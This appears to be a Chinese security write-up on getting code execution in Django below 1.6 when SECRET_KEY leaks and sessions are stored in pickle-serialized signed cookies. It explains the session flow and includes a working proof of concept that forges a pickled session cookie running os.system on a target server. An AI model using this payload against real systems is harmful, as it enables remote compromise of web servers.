# 从django的SECRET_KEY到代码执行

0x00 背景
=======

* * *

最近审查代码发现某些产品在登录的`JS`代码中泄露了`SECRET_KEY`,将该值作为密码加密的盐，这样就暴露了加密`salt`不太好吧，更重要的是对`django`的安全造成了极大的威胁。

0x01 SECRET_KEY作用
=================

* * *

`SECTET_KEY`在`djanog`中使用非常广泛，基本上涉及到安全，加密等的地方都用到了，下面列举一些常见情景：

1，`json object`的签名

2，加密函数，如密码重置，表单，评论，`csrf`的`key`，`session`数据

这里面就要重点讲到`session`的问题，在这里使用不当就会导致代码执行

0x02 代码执行
=========

* * *

### 2.1 settings的session设置

`django`默认存储`session`到数据库中，但是可能会比较慢，就会使用到缓存，文件，还有`cookie`等方式，如果采用了`cookie`机制则有可能代码执行，settings配置如下：

```
SESSION_ENGINE = 'django.contrib.sessions.backends.signed_cookies'

```

### 2.2 django 1.6以下

在`django1.6`以下，`session`默认是采用`pickle`执行序列号操作，在`1.6`及以上版本默认采用`json`序列化。代码执行只存在于使用`pickle`序列话的操作中。

### 2.3 session处理流程

可以简单的分为两部分，`process_request`和`process_response`,前者负责选择`session`引擎，初始化`cookie`数据。见代码

```
class SessionMiddleware(object):
    def process_request(self, request):
        engine = import_module(settings.SESSION_ENGINE)
        session_key = request.COOKIES.get(settings.SESSION_COOKIE_NAME, None)
        request.session = engine.SessionStore(session_key)

```

`process_response`则是处理返回给用户的`cookie`信息，比如修改过期时间等。在将`session`存入缓存后，可能在某个操作中会用到`session`信息，这个时候就会通过反序列化操作从缓存中取，如果反序列话引擎是采用`pickle`机制的话就存在代码执行。反序列化的代码位于`django.core.signing.py`中，这个模块主要是一些签名，加解密操作，同时也包含序列化和反序列化，默认采用`JSON`引擎，下面是反序列话`loads`的代码：

```
def loads(s, key=None, salt='django.core.signing', serializer=JSONSerializer, max_age=None):
    """
    Reverse of dumps(), raises BadSignature if signature fails
    """
    base64d = smart_str(
        TimestampSigner(key, salt=salt).unsign(s, max_age=max_age))
    decompress = False
    if base64d[0] == '.':
        # It's compressed; uncompress it first
        base64d = base64d[1:]
        decompress = True
    data = b64_decode(base64d)
    if decompress:
        data = zlib.decompress(data)
    return serializer().loads(data)

```

### 2.4 构造POC

```
import os
os.environ.setdefault('DJANGO_SETTINGS_MODULE','settings')
from django.conf import settings
from django.core import signing
from django.contrib.sessions.backends import signed_cookies


class Run(object):
    def __reduce__(self):
        return (os.system,('touch /tmp/xxlegend.log',))

sess = signing.dumps(Run(), serializer=signed_cookies.PickleSerializer,salt='django.contrib.sessions.backends.signed_cookies')
print sess

import urllib2
import cookielib

url = 'http://10.24.35.228:8000/favicon.ico'
headers = {'Cookie':'sessionid="%s"' %(sess)}
request = urllib2.Request(url,headers = headers)
response = urllib2.urlopen(request)
print response.read()

```

通过序列化`Run`类，实现创建一个文件的操作，在反序列化的时候执行这个操作。执行代码完成可看到在`/tmp`目录创建`xxlegend.log`文件，同时`web`报`500`错误。

0x03 总结
=======

* * *

利用条件总结起来就是这么几句话，首先泄露了`SECRET_KEY`,其次`session`引擎采用了`signed_cookies`,`django`版本小于`1.6`即存在代码执行问题。同样的问题也存在于`python`的其他`web`框架中，如`flask`，`bottle`。